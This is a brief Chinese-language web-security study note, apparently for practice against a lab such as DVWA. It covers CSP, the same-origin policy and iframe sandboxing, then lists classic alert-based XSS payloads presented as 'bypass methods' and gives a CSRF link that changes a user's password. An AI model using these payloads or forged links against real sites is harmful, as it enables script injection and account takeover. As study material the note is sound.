### 内容安全策略（CSP）
内容安全策略   (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等

### Web浏览器安全策略
* CSP
* 安全沙箱 H5新增特性，使用标签``<iframe>``
* 同源策略 最基本的安全策略，由网景提出，同源指的是域名、协议、端口相同




## XSS
### 绕过方法
```
<script>alert("test")</script>

<img src="javascript:alert('XSS')">

<img src="#" onerror=alert(/跨站/)></img>

<img src="javascript:alert(/xss/)">

<iframe/onload=alert(/insight-labs/)>

<div style=”width:expression(alert('xsser'))″>xsser</div>
```

### CSRF(cross site request forgery)
* 直接生成包含url参数的欺骗链接，如在任何未验证的情况下修改用户密码：http://10.1.1.174/vulnerabilities/csrf/**?password_new=123&password_conf=123&Change=Change#**
